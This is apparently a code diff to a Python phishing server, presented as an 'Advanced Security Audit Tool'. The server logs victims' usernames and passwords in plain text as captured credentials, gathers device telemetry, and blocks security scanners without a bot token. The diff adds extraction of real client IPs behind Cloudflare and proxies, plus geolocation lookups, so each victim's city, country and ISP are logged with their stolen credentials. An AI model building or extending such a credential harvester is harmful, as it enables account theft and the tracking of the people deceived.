@@ -2,6 +2,7 @@
 import http.server
 import socketserver
 import urllib.parse
+import urllib.request
 import os
 import threading
 import json
@@ -145,12 +146,46 @@ HTML_PAGE = """
 </html>
 """
 
+def get_geolocation(ip):
+    """Fetches Country, City, and ISP data using IP Geolocation API."""
+    if ip in ["127.0.0.1", "localhost", "::1"]:
+        return {"country": "Local Network", "city": "Local", "isp": "Local"}
+    try:
+        url = f"http://ip-api.com/json/{ip}"
+        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=2) as response:
+            data = json.loads(response.read().decode())
+            if data.get("status") == "success":
+                return {
+                    "country": data.get("country", "Unknown"),
+                    "city": data.get("city", "Unknown"),
+                    "isp": data.get("isp", "Unknown")
+                }
+    except Exception:
+        pass
+    return {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
+
 class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
     daemon_threads = True
 
 class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
+    def get_client_ip(self):
+        # Extract real client IP behind Cloudflare Tunnel or Proxies
+        cf_ip = self.headers.get('CF-Connecting-IP')
+        if cf_ip:
+            return cf_ip
+        forwarded = self.headers.get('X-Forwarded-For')
+        if forwarded:
+            return forwarded.split(',')[0].strip()
+        return self.client_address[0]
+
     def do_GET(self):
         if self.path == '/' or self.path == '/index.html':
+            client_ip = self.get_client_ip()
+            geo = get_geolocation(client_ip)
+            
+            print(f"\033[94m[VISIT] IP: {client_ip} | Location: {geo['city']}, {geo['country']} | ISP: {geo['isp']}\033[0m")
+            
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
@@ -163,6 +198,8 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
     def do_POST(self):
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
+        client_ip = self.get_client_ip()
+        geo = get_geolocation(client_ip)
 
         if self.path == '/login':
             try:
@@ -173,7 +210,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                 bot_token = data.get('botToken', '')
 
                 if not bot_token or not bot_token.startswith('verified_human_'):
-                    log_entry = f"[BOT BLOCKED] IP: {self.client_address[0]} | Automated scanner/bot detected.\n"
+                    log_entry = f"[BOT BLOCKED] IP: {client_ip} ({geo['country']}) | Automated scanner detected.\n"
                     print(f"\033[91m{log_entry}\033[0m")
                     with open(LOG_FILE, "a") as f:
                         f.write(log_entry)
@@ -183,7 +220,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                     self.wfile.write(json.dumps({"status": "bot_blocked"}).encode('utf-8'))
                     return
 
-                log_entry = f"[CREDENTIAL CAPTURED (Attempt {attempt + 1})] IP: {self.client_address[0]} | Username: {username} | Password: {password}\n"
+                log_entry = f"[CREDENTIAL CAPTURED (Attempt {attempt + 1})] IP: {client_ip} | Location: {geo['city']}, {geo['country']} ({geo['isp']}) | Username: {username} | Password: {password}\n"
                 print(f"\033[92m{log_entry}\033[0m")
                 
                 with open(LOG_FILE, "a") as f:
@@ -206,7 +243,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
         elif self.path == '/telemetry':
             try:
                 telemetry = json.loads(post_data.decode('utf-8'))
-                log_entry = f"[DEVICE INTEL] IP: {self.client_address[0]} | Data: {json.dumps(telemetry)}\n"
+                log_entry = f"[DEVICE INTEL] IP: {client_ip} | Location: {geo['city']}, {geo['country']} | Data: {json.dumps(telemetry)}\n"
                 print(f"\033[93m{log_entry}\033[0m")
                 
                 with open(LOG_FILE, "a") as f:
@@ -223,7 +260,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
 def run_server():
     server_address = ('', PORT)
     httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
-    print(f"\033[96m[*] Advanced Security Audit Tool v3.1 running on port {PORT}...\033[0m")
+    print(f"\033[96m[*] Advanced Security Audit Tool v4 (Geolocation & Cloudflare IP Support) running on port {PORT}...\033[0m")
     print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
     try:
         httpd.serve_forever()
